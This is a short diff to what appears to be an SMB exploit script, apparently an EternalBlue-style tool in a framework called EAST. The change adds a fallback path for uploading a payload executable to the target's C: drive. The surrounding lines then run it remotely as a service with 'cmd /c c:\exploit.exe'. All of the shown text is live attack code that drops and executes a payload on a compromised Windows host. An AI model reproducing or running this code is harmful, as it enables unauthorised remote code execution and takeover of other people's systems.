@@ -923,7 +923,10 @@ def smb_pwn(conn, arch):
 	#smbConn.closeFile(tid2, fid2)
 	#smbConn.disconnectTree(tid2)
 	print"DIRECTORY-SCRIPT : "+ os.getcwd()
-	smb_send_file(smbConn, '/etc/EAST/tmp/payloadEAST.exe', 'C', '/exploit.exe')
+	try:
+		smb_send_file(smbConn, '/etc/EAST/tmp/payloadEAST.exe', 'C', '/exploit.exe')
+	except:
+		smb_send_file(smbConn, 'c:\EAST\tmp\payloadEAST.exe', 'C', '/exploit.exe')
 	service_exec(conn, r'cmd /c c:\exploit.exe')
 	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
